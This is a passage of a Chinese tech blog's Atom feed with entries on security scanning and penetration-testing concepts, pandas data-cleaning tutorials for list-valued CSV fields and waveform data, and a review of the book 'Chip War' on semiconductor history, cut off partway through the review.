<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XieJava&#39;s blog</title>
  
  <subtitle>记录最好的自己</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://xiejava.gitee.io/"/>
  <updated>2023-12-19T01:32:00.950Z</updated>
  <id>https://xiejava.gitee.io/</id>
  
  <author>
    <name>XieJava</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>安全运营之安全检查和测试</title>
    <link href="https://xiejava.gitee.io/posts/c6e7113b/"/>
    <id>https://xiejava.gitee.io/posts/c6e7113b/</id>
    <published>2023-12-19T01:28:06.000Z</published>
    <updated>2023-12-19T01:32:00.950Z</updated>
    
    <content type="html"><![CDATA[<p>安全运营是一个将技术、流程和人有机结合的复杂系统工程，通过对已有安全产品、工具和服务产出的数据进行有效的分析，持续输出价值，解决安全问题，以确保网络安全为最终目标。</p><p>安全检查和测试是确保系统、设备或环境安全的重要手段，是安全运营基础工作的一部分。</p><p>安全检查主要通过定期或不定期地对系统、设备或环境进行全面的检查，以发现潜在的安全风险和漏洞。检查的内容可能包括各级人员安全责任制的落实情况、安全活动开展的贯彻落实情况、安全规章制度和措施的落实情况、现场安全管理情况、员工的遵章守纪情况以及员工安全操作规程及安全常识掌握情况等。</p><p>安全测试则是一种通过模拟攻击者的行为，测试系统的安全性，并发现潜在的弱点和漏洞的过程。这可以包括网络渗透测试、应用程序渗透测试等。</p><p>安全检查和测试包括日常的安全扫描、安全检查和针对信息系统的渗透测试。</p><h2 id="一、安全扫描"><a href="#一、安全扫描" class="headerlink" title="一、安全扫描"></a>一、安全扫描</h2><p>通过按照计算机信息系统安全的国家标准、相关行业标准设计、编写、制造的安全扫描工具，分析并指出有关网络的安全漏洞及被测系统的薄弱环节，给出详细的检测报告，并针对检测到的网络安全隐患给出相应的修补措施和安全建议。</p><p>安全扫描目的是提高内部网络安全防护性能和抗破坏能力，检测评估已运行网络的安全性能，为网络系统管理员提供实时安全建议。安全扫描作为一种积极主动的安全防护技术，提供了对内部攻击、外部攻击和误操作的实时保护，在网络系统受到危害之前可以提供安全防护解决方案。</p><p>安全扫描是一种快速有效的安全评估手段，可以发现系统可能存在的部分安全问题，一般会采用安全扫描工具进行安全扫描，漏扫工具会根据目前安全行业漏洞发掘情况，对扫描系统漏洞库不断进行更新。使在扫描过程中，可以发现系统更多的安全问题。</p><p>在安全扫描过程中严格遵守以下原则：</p><p>1）服务不能影响目标系统所承载的业务运行；</p><p>2）服务不能严重影响目标系统的自身性能；</p><p>3）操作时间选择在系统业务量最小，业务临时中断对外影响最小的时候。</p><h2 id="二、安全检查"><a href="#二、安全检查" class="headerlink" title="二、安全检查"></a>二、安全检查</h2><p>安全检查是指安全专家登录主机，网络设备，根据检查列表对可能存在的安全漏洞进行逐项检查，根据检查结果提供详细的漏洞描述和修补方案。人工检查作为人工实施的安全评估手段可以有效弥补由于在防火墙策略或者其他安全设备的防护措施下，安全扫描工具无法扫描发现系统内部特定区域的缺陷。通过安全专家在主机、网络等设备上的实际操作，可以更深程度地发现系统存在的问题及需要安全增强的脆弱点。</p><p>安全检查是信息系统脆弱性发掘的一种有效措施，可以发现系统内部帐号策略、权限管理、日志审核、网络服务等诸多问题。对服务器及网络系统来说人工检查是安全加固的必要步骤。</p><h2 id="三、渗透测试"><a href="#三、渗透测试" class="headerlink" title="三、渗透测试"></a>三、渗透测试</h2><p>渗透测试（penetration test）是通过模拟恶意攻击的方法，来评估系统是否存在安全风险的一种评估方法。这个过程包括对系统的任何弱点、技术缺陷或漏洞的主动分析，安全渗透测试工程师以攻击者的视角从一个攻击者可能存在的位置来进行的，并且从这个位置有条件主动利用安全漏洞。渗透测试还具有的两个显著特点是：渗透测试是一个渐进的并且逐步深入的过程。渗透测试是选择不影响业务系统正常运行的攻击方法进行的测试。</p><p>1、渗透测试方法</p><p>黑盒渗透测试：是为了证明信息系统在网络孤岛的情况下面对 APT 攻击的危险性，系统安全防御是否按照预期计划正常运行而提供的一种测试方案。</p><p>测试过程中，会综合采用各种手段和途径，包括端口扫描，漏洞扫描，密码猜测， 密码破解，数据窃听，伪装欺骗等技术方式。最终目的就是为了检验该网络各个环节的安全性。</p><p>2、模拟渗透测试技术</p><p>模拟渗透入侵测试，是指为了对一个目标网络的安全性进行实际检查，进行不带攻击行为的全面安全检测；是一个在评估目标主机、网络、嵌入式设备的安 全性，模仿黑客特定攻击行为的过程。</p><p>详细地说，是指测试工程师尽可能完整的收集相关信息，利用收集到的信息进行靶场搭建，完整的模拟黑客使用的漏洞发现技术和攻击手段，对目标网络的安全性作完整攻击复现的过程。</p><p>通过安全检查和测试，可以及时发现并解决潜在的安全问题，提高系统的安全性，确保系统、设备或环境的安全稳定运行。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;安全运营是一个将技术、流程和人有机结合的复杂系统工程，通过对已有安全产品、工具和服务产出的数据进行有效的分析，持续输出价值，解决安全问题，以确保网络安全为最终目标。&lt;/p&gt;
&lt;p&gt;安全检查和测试是确保系统、设备或环境安全的重要手段，是安全运营基础工作的一部分。&lt;/p&gt;
&lt;p
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>pandas对波形异常数据处理实战</title>
    <link href="https://xiejava.gitee.io/posts/90eddb0b/"/>
    <id>https://xiejava.gitee.io/posts/90eddb0b/</id>
    <published>2023-12-18T04:06:42.000Z</published>
    <updated>2023-12-18T04:24:29.981Z</updated>
    
    <content type="html"><![CDATA[<p>做数据分析很大一部分工作量都是在对数据处理，因为数据来源的质量问题，不能保证所有的数据都是正常的。对于数据分析和处理来说pandas无疑是常用的利器。下面通过一个实例来用pandas对波形异常数据进行实战处理。</p><h2 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">df_data=pd.read_csv(<span class="string">'data\HRTrend测试波形.csv'</span>)</span><br><span class="line">df_data</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231218/1_%E5%8E%9F%E5%A7%8B%E6%B3%A2%E5%BD%A2%E6%95%B0%E6%8D%AE.png" alt="原始波形数据"></p><p>从csv导入的数据是文本字符串类型的，用《<a href="http://xiejava.ishareread.com/posts/9d6f73eb/" target="_blank" rel="noopener">Python将列表中的数据写入csv并正确读取解析</a>》中介绍的方法将文本数据转成列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2list</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> np.fromstring(str[<span class="number">1</span>:<span class="number">-1</span>], sep=<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">df_data[<span class="string">'HRTrend'</span>]=df_data[<span class="string">'HRTrend'</span>].apply(str2list)</span><br><span class="line">df_data</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231218/2_%E6%96%87%E6%9C%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AClist%E5%90%8E%E7%9A%84%E6%B3%A2%E5%BD%A2%E6%95%B0%E6%8D%AE.png" alt="文本字符串转list后的波形数据"><br>用plt查看图形</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fig,axes = plt.subplots(<span class="number">3</span>,<span class="number">4</span>,figsize=(<span class="number">12</span>,<span class="number">4</span>))</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        axes[x,y].plot(df_data[<span class="string">'HRTrend'</span>][i])</span><br><span class="line">        i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231218/3_%E5%BC%82%E5%B8%B8%E6%95%B0%E6%8D%AE%E6%B3%A2%E5%BD%A2.png" alt="异常数据波形"></p><p>从图形上看出现了异常。我们抽一个数据进行查看，发现前后有很多空值，并且在数据中也存在缺失值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df_data[<span class="string">'HRTrend'</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231218/4_%E5%BC%82%E5%B8%B8%E6%95%B0%E6%8D%AE%E5%AE%9E%E4%BE%8B.png" alt="异常数据实例"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plt.plot(df_data[<span class="string">'HRTrend'</span>][<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231218/5_%E5%BC%82%E5%B8%B8%E5%9B%BE%E5%BD%A2%E5%AE%9E%E4%BE%8B.png" alt="异常图形实例"></p><p>用plt画出图形，可以看到因为有缺失值所以图形并不连续。</p><h2 id="异常数据处理"><a href="#异常数据处理" class="headerlink" title="异常数据处理"></a>异常数据处理</h2><p>为了更好的展示图像，为以后的数据分析准备数据，我们需要将前后的空值去掉，对于中间存在的异常值我们可以用前值或后值进行填充。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义一个方法，先将空值用0填充，然后去首尾的0，再将中间存在异常的值用前值填充。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ruledata</span><span class="params">(df_cloumn)</span>:</span></span><br><span class="line">    ps=pd.Series(df_cloumn).fillna(<span class="number">0</span>) <span class="comment">#先将为空值用0填充</span></span><br><span class="line">    values=pd.Series(np.trim_zeros(ps)).replace(to_replace=<span class="number">0</span>, method=<span class="string">'ffill'</span>).values <span class="comment">#去首尾0,然后用异常值填充</span></span><br><span class="line">    <span class="keyword">return</span> values</span><br><span class="line">df_data[<span class="string">'rule_HRTrend'</span>]=df_data[<span class="string">'HRTrend'</span>].apply(ruledata) <span class="comment">#将异常数据处理的方法进行应用处理异常值</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fig,axes = plt.subplots(<span class="number">3</span>,<span class="number">4</span>,figsize=(<span class="number">12</span>,<span class="number">4</span>))</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        axes[x,y].plot(df_data[<span class="string">'rule_HRTrend'</span>][i])</span><br><span class="line">        i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231218/6_%E5%BC%82%E5%B8%B8%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%90%8E%E7%9A%84%E6%AD%A3%E5%B8%B8%E5%9B%BE%E5%BD%A2.png" alt="异常数据处理后的正常图形"></p><p>最后可以发现经过异常值修复后图形变得正常连续了。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;做数据分析很大一部分工作量都是在对数据处理，因为数据来源的质量问题，不能保证所有的数据都是正常的。对于数据分析和处理来说pandas无疑是常用的利器。下面通过一个实例来用pandas对波形异常数据进行实战处理。&lt;/p&gt;
&lt;h2 id=&quot;读取数据&quot;&gt;&lt;a href=&quot;#读取数
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="开发" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python将列表中的数据写入csv并正确解析出来</title>
    <link href="https://xiejava.gitee.io/posts/9d6f73eb/"/>
    <id>https://xiejava.gitee.io/posts/9d6f73eb/</id>
    <published>2023-12-16T13:18:15.000Z</published>
    <updated>2023-12-16T13:26:08.426Z</updated>
    
    <content type="html"><![CDATA[<p>用Python做数据处理常常会将数据写到文件中进行保存，又或将保存在文件中的数据读出来进行使用。通过Python将列表中的数据写入到csv文件中很多人都会，可以通过Python直接写文件或借助pandas很方便的实现将列表中的数据写入到csv文件中，但是写进去以后取出有些字段会有变化有些坑还是要避免。本文通过实例来介绍如何将列表中的数据写入文件如csv并正确解析出来使用。</p><p>示例数据如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data = [[<span class="string">'John'</span>, <span class="string">'25'</span>, <span class="string">'Male'</span>,[<span class="number">99</span>,<span class="number">100</span>,<span class="number">98</span>]],</span><br><span class="line">        [<span class="string">'Emily'</span>, <span class="string">'22'</span>, <span class="string">'Female'</span>,[<span class="number">97</span>,<span class="number">99</span>,<span class="number">98</span>]],</span><br><span class="line">        [<span class="string">'Michael'</span>, <span class="string">'30'</span>, <span class="string">'Male'</span>,[<span class="number">97</span>,<span class="number">99</span>,<span class="number">100</span>]]]</span><br></pre></td></tr></table></figure><h2 id="通过pandas将数据写入csv"><a href="#通过pandas将数据写入csv" class="headerlink" title="通过pandas将数据写入csv"></a>通过pandas将数据写入csv</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.DataFrame(data,columns=[<span class="string">'Name'</span>, <span class="string">'Age'</span>, <span class="string">'Gender'</span>,<span class="string">'Score'</span>])</span><br><span class="line">filename = <span class="string">'data\pd_data.csv'</span></span><br><span class="line">df.to_csv(filename, index=<span class="literal">False</span>)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231216/pd_data.png" alt="数据集"></p><p>我们对原始的数据中的分数Score字段进行求和统计总分TotalScore</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="string">'TotalScore'</span>]=df[<span class="string">'Score'</span>].apply(sum)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231216/pd_data_totalscore.png" alt="数据集TotalScore"></p><h2 id="通过pandas将csv文件中的数据读出"><a href="#通过pandas将csv文件中的数据读出" class="headerlink" title="通过pandas将csv文件中的数据读出"></a>通过pandas将csv文件中的数据读出</h2><p>用pandas将csv文件将数据读出也是非常方便的一行代码就可以搞定</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df_read_csv=pd.read_csv(filename)</span><br><span class="line">df_read_csv</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231216/pd_data.png" alt="数据集"></p><p>但是会发现从csv文件中读出数据后形成的dataframe数据集对数据中的分数Score字段进行求和统计总分TotalScore会报错！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df_read_csv[<span class="string">'TotalScore'</span>]=df_read_csv[<span class="string">'Score'</span>].app</span><br><span class="line"></span><br><span class="line">TypeError: unsupported operand type(s) <span class="keyword">for</span> +: <span class="string">'int'</span> <span class="keyword">and</span> <span class="string">'str'</span></span><br></pre></td></tr></table></figure><p>原因是原数据中Score字段中的数据是list但是报错至文件读出来后这个字段变成了字符串，字符串不能求和。</p><p><strong>解决方案</strong><br>将字段中为字符串的值进行转换，转换成list，numpy提供了string转list的方法，当然也可以自己写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeArray</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="comment">#return [int(item) for item in text[1:-1].split(',')]  #将字串转换成列表</span></span><br><span class="line">    <span class="keyword">return</span> np.fromstring(text[<span class="number">1</span>:<span class="number">-1</span>], sep=<span class="string">','</span>)  <span class="comment">#用numpy提供的方法将字串转换成列表</span></span><br><span class="line"></span><br><span class="line">df_read_csv[<span class="string">'Score'</span>]=df_read_csv[<span class="string">'Score'</span>].apply(makeArray) <span class="comment">#将Score由字符串转成列表</span></span><br><span class="line">df_read_csv[<span class="string">'TotalScore'</span>]=df_read_csv[<span class="string">'Score'</span>].apply(sum)</span><br><span class="line">df_read_csv</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231216/pd_data_totalscore.png" alt="数据集TotalScore"></p><p>可以看到这下Score字段可以正常的进行求和统计总分TotalScore了。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a><br> <center> </p><br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;用Python做数据处理常常会将数据写到文件中进行保存，又或将保存在文件中的数据读出来进行使用。通过Python将列表中的数据写入到csv文件中很多人都会，可以通过Python直接写文件或借助pandas很方便的实现将列表中的数据写入到csv文件中，但是写进去以后取出有些字
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="开发" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>《芯片战争》读后感-得芯片者得天下</title>
    <link href="https://xiejava.gitee.io/posts/41bc24fd/"/>
    <id>https://xiejava.gitee.io/posts/41bc24fd/</id>
    <published>2023-12-02T07:56:21.000Z</published>
    <updated>2023-12-02T09:39:05.755Z</updated>
    
    <content type="html"><![CDATA[<p>随着社会的进步和技术的发展，以互联网产业化、人工智能等为代表的第四次工业革命席转全球，人工智能技术如火如荼，将整个世界推入了智能化时代。有人说石油是现在工业的血液，那么芯片就是现代工业的大脑。芯片作为现代工业的大脑，它们被广泛应用于各种电子设备、通信、计算机、人工智能等领域。在现代电子设备中发挥着核心的作用。芯片可以控制和操作各种电子设备，执行复杂的运算和数据处理任务，实现各种智能化的功能。随着科技的进步和数字化转型的加速，芯片在各个领域的应用越来越广泛，从计算机、手机、汽车到航空航天、医疗、国防等各个领域，都离不开芯片的支持和推动，半导体芯片在现代技术和工业中的重要性无法被低估。</p><p>近年来在中美贸易战中，芯片起到了关键的战略性作用。在中美贸易战期间，半导体芯片成为了贸易争端的一个焦点和核心议题。2018年4月开始，美国政府针对我国发动了一场以芯片为核心的科技战，我们可以把之称为芯片战争。</p><p>《芯片战争》是一部从企业竞争和国力较量的角度讲述全球芯片产业发展历程的书籍。全书分上部全球芯风云和下部中国芯势力，上部主要讲述了全球芯片产业的发展史和芯片产业链的变迁，下部主要讲述了中国芯片的崛起与芯片产业发展的最新动态。作者余盛是国内战略咨询专家、消费品营销专家及财经作家。这本书是作者继《手机战争》之后关于信息产业领域的第二部力作，目前豆瓣评分是8.6分。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231202/%E8%8A%AF%E7%89%87%E6%88%98%E4%BA%89.png" alt="在这里插入图片描述"></p><h2 id="什么是芯片"><a href="#什么是芯片" class="headerlink" title="什么是芯片"></a>什么是芯片</h2><p>芯片，也被称为集成电路（Integrated Circuit，IC）或微芯片，是一种将多个电子元件（如晶体管、电阻、电容等）集成到一个小而紧凑的半导体片上的技术和产品。现代芯片可以包含数十亿个这样的元件，它们通过复杂的制造过程被制作在一块硅晶圆上。这个过程包括设计、掩模制作、光刻、蚀刻、沉积和测试等多个步骤。最终得到的芯片具有各种功能，例如处理数据（如CPU）、存储信息（如RAM、ROM）、或者进行信号放大和转换（如运算放大器、ADC/DAC）。芯片的应用非常广泛，涵盖了几乎所有的电子设备，从计算机和手机到家用电器、汽车、医疗设备甚至军事装备。由于其体积小、耗电少、成本低、速度快等特点，芯片对于推动科技进步和现代化生活起到了至关重要的作用。</p><h2 id="芯片的发展历程"><a href="#芯片的发展历程" class="headerlink" title="芯片的发展历程"></a>芯片的发展历程</h2><p>集成电路（芯片）在其早期发展阶段受到了美国国防工业的支持和推动。20世纪中叶，随着冷战的升温，美国政府和军方对于新技术的需求增加，特别是对于更小型化、更高效和更可靠的电子设备和计算机系统的需求。集成电路的发展为解决这些需求提供了重要支持。在这一时期，美国国防部和一些政府机构积极支持了集成电路技术的研究和发展。例如，1958年美国国家航空航天局（NASA）成立时，其推动了一系列技术创新，并且在航天器和计算机系统中广泛采用了集成电路。此外，军方对于集成电路在军事通信、导航系统和计算机技术中的应用也给予了关注和资金支持。<br>芯片的发展历程可以追溯到20世纪中叶，经历了几个阶段的演变。以下是芯片发展的主要历史阶段：</p><ul><li>初期概念（1940s - 1950s）： 芯片的概念最早在20世纪40年代末至50年代初由多位科学家和工程师提出。在这一时期，电子元件的集成度很低，电子器件主要通过手工连接构建。</li><li>第一代晶体管技术（1950s - 1960s）： 随着晶体管的发明和使用，电子器件变得更加小型化和可靠。这一时期的电子器件仍然是离散的，但晶体管的引入为集成电路奠定了基础。</li><li>集成电路的诞生（1958年）： 杰克·基尔比（Jack Kilby）和罗伯特·诺伊斯（Robert Noyce）分别在1958年几乎同时提出了集成电路的概念。基尔比使用了间歇技术将几个器件集成到单个硅片上，而诺伊斯则提出了将多个晶体管集成到单个硅片上的全片法。这标志着集成电路的诞生，为后来的芯片技术奠定了基础。</li><li>摩尔定律的确立（1965年）： 戈登·摩尔（Gordon Moore）在1965年提出了著名的摩尔定律，指出集成电路上可容纳的晶体管数量每隔约18至24个月会翻倍。这一定律推动了半导体行业的迅猛发展，促使了芯片技术的不断创新和提升。</li><li>LSI和VLSI技术的发展（1960s - 1970s）： 大规模集成电路（LSI）和超大规模集成电路（VLSI）技术的发展使得更多的晶体管能够集成到单个芯片上。这一时期，芯片的功能和复杂性不断增加，应用领域也逐渐扩展。</li><li>先进制程和微纳米技术（1980s至今）： 随着半导体制造技术的不断进步，制程尺寸不断减小。从1980年代开始，微纳米技术逐渐成为主流，芯片上的晶体管数量呈指数级增长。这一时期，集成电路的制造变得更加复杂，包括光刻、蚀刻、离子注入等高度精密的制程。</li><li>多核处理器和异构集成电路（2000s至今）： 随着对计算能力和功耗效率的不断需求，多核处理器和异构集成电路的兴起成为一个重要趋势。这使得在一个芯片上集成不同类型的处理器和功能成为可能，以满足不同应用的需求。</li></ul><p>芯片的发展历程体现了对集成度、性能、功耗等方面不断追求的过程。这一过程推动了信息技术的发展，影响了现代社会的方方面面。</p><h2 id="芯片技术为什么难攻克"><a href="#芯片技术为什么难攻克" class="headerlink" title="芯片技术为什么难攻克"></a>芯片技术为什么难攻克</h2><p>芯片技术随着这么多少年的快速发展，使得芯片技术变得异常复杂且具有高度专业性，涉及多个复杂的技术、物理和工程难题，对于后来者造成了巨大的技术壁垒。</p><ul><li>制程复杂性：<br>制造芯片的制程非常复杂，涉及多个步骤，如光刻、蚀刻、沉积、离子注入等。随着制程尺寸不断减小，对制程的控制要求越来越高。微纳米技术的应用使得芯片上的元件尺寸趋近或小于100纳米，目前世界上最先进的芯片制造制程是3纳米，需要高度精密的制造工艺。</li><li>摩尔定律挑战：<br>摩尔定律指出，集成电路上的晶体管数量每隔一段时间会翻倍，但随着晶体管尺寸的不断缩小，已经接近原子尺度的极限。超越这一极限需要开发新的技术和材料，例如量子点技术、碳纳米管等。</li><li>材料科学难题：<br>随着制程的进一步微缩，新的材料需求不断涌现。寻找符合要求的材料，能够在小尺寸下保持稳定性、导电性、绝缘性等特性，是一个具有挑战性的问题。</li><li>热管理问题： 集成电路的密度增加，功耗也随之增加。如何有效地管理芯片上的热量，防止过热对性能和寿命造成影响，是一个重要的挑战。</li><li>设计复杂性：<br>芯片设计变得越来越复杂，涉及到大量的晶体管和电路元件。设计出高性能、低功耗、可靠的芯片需要高度专业的技术和工程知识，而且设计周期较长。</li><li>成本压力：<br>高度先进的制程和设备投资成本巨大。发展新技术需要大量的研发资金，而且芯片制造商需要在竞争激烈的市场中保持竞争力，这对技术和成本控制提出了更高要求。</li></ul><h2 id="目前芯片产业的格局"><a href="#目前芯片产业的格局" class="headerlink" title="目前芯片产业的格局"></a>目前芯片产业的格局</h2><p>在全球范围内，目前参与芯片产业领域竞争的主要经济体包括中国、美国、日本、韩国、中国台湾地区、欧州等。</p><ol><li>中美两国： 中美之间的竞争是最引人注目的。美国在半导体领域拥有一些全球领先的企业，而中国则致力于迎头赶超，并投资大量资源用于半导体技术的研发和产业发展。两国之间存在着贸易争端和技术战略的角力。</li><li>日本：日本是全球领先的半导体生产国之一，拥有多家知名半导体公司，如东芝、富士通等。在芯片产业领域竞争，日本致力于发展先进的半导体技术，并将其应用于各种产品和服务中，包括汽车、电子设备和工业设备等。</li><li>韩国：韩国是全球最大的半导体生产国之一，拥有三星、LG等知名半导体公司。在芯片战争中，韩国通过大力发展半导体产业，实现了经济的快速增长和技术赶超。韩国的半导体产品广泛应用于全球市场，包括手机、电视、电脑等电子产品。</li><li>中国台湾：台湾的半导体产业在全球范围内具有重要地位，拥有台积电、联发科技等知名公司。台湾的半导体技术广泛应用于各种电子产品，包括手机、电脑、电视等。在芯片产业领域，台湾致力于维护自己的市场份额和技术优势。</li><li>欧洲：欧洲在芯片产业领域竞争中扮演了重要角色，拥有多家领先的半导体公司，如意法半导体、荷兰恩智浦、荷兰的ASML等。欧洲致力于发展自主的半导体产业，以减少对美国和亚洲的依赖，并推动创新和经济增长。</li></ol><p>芯片产业的格局涉及到全球范围内的多个公司</p><ul><li>主要制造商：<br>台湾半导体制造公司（TSMC）： 作为全球最大的独立芯片制造厂商之一，TSMC提供给包括苹果、英特尔、AMD等公司制造先进的芯片。其技术领先地位使其成为全球芯片制造的中流砥柱。<br>三星电子： 三星不仅在芯片制造领域有重要地位，还在内存、存储器和其他半导体产品方面具有竞争力。<br>英特尔： 作为一家全球领先的芯片设计和制造公司，英特尔在服务器、个人电脑和数据中心等领域占据主导地位。</li><li>设计公司：<br>美国公司： 在芯片设计领域，美国的公司占据主导地位。例如，英特尔、高通、博通、NVIDIA等公司在处理器、通信芯片、图形处理器等领域具有显著的市场份额。<br>中国公司： 中国也在不断加强在芯片设计领域的实力，包括华为旗下的海思、紫光展锐等公司。中国一直在推动本国芯片产业的发展，投资大量资源进行研发和支持本土芯片公司。</li><li>消费电子公司：<br>苹果、三星、华为、小米等： 